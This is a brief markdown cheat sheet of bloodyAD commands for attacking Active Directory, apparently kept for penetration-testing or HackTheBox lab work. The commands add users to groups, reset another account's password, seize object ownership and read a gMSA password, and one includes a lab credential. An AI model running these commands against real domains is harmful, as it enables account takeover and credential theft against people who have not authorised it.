# bloodyAD

% AD

## bloodyAD - add user to group
```
bloodyAD --host <DCIP> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWD>' add groupMember '<GROUP NAME>' '<USERNAME>'  
```

## bloodyAD - set passwd

```
bloodyAD --host "$TARGET" -d "<DOMAIN>" -u '<USER>' -p '<PASSWD>' set password <TARGETED ACC> '<PASSWD>'
```

## bloodyAD - set X as owner of Y

```
bloodyAD --host "$TARGET" -d "tombwatcher.htb" -u "<X>" -p "<PASSWD X>" set owner '<VICTIM>' '<X>'
```

## bloodyAD - read gMSA passwd

```
# bloodyAD - read gMSA passwd
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

## bloodyAD - foo
```
  
```



